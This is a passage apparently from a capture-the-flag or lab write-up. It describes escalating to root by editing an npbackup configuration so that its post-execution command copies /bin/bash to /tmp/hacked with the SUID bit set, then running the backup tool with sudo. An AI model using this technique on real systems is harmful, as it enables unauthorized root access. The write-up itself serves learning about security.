## Looking at the code of the config file,
## It appears that we can add a post execution command
## Since it can run as root, Lets add a malicious command

![img]({{ '/assets/images/code/14-code.png' | relative_url }}){: .center-image }

## We will modify the post execution command:
![img]({{ '/assets/images/code/15-code.png' | relative_url }}){: .center-image }
> post_exec_commands: [cp /bin/bash /tmp/hacked; /bin/chmod +s /tmp/hacked]
## (This copied /bin/bash into a file named hacked in the /tmp directory and added the suid bit)
<br>
## After modifying the config file, let's now run the backup script:

{% highlight bash %}
$ sudo /usr/local/bin/npbackup-cli -c /home/marco/npbackup.conf -b
{% endhighlight bash %}
